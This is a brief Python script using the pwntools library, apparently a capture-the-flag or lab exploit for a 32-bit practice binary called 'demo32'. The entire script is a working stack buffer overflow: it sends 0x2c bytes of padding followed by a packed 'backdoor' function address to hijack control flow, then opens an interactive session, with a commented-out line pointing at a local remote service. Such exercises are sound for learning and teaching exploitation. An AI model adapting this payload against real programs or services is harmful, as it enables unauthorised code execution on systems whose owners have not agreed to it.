from pwn import *

context.log_level = "debug"

io = process("./demo32")
#io = remote("127.0.0.1",8887)

io.recv()

backdoor = 0x080488a8


payload = b"A"*0x2c + p32(backdoor)

pause()
io.sendline(payload)

pause()
input()
io.interactive()
